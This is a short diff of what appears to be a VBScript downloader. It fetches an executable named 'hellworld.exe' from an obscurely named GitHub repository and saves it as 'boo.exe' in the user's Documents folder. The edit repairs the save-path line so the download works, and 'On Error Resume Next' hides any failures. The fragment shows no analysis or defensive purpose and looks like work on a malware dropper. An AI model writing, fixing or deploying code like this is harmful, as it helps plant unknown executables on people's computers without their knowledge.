@@ -18,7 +18,7 @@
       Dim url, savePath
 
       url = "https://github.com/Nuthoul/ergetbnerbepkwnef/raw/refs/heads/main/hellworld.exe"
-      savePath = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Documents\boo.exe"
+      savePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERPROFILE%") & "\Documents\boo.exe"
 
       On Error Resume Next
 
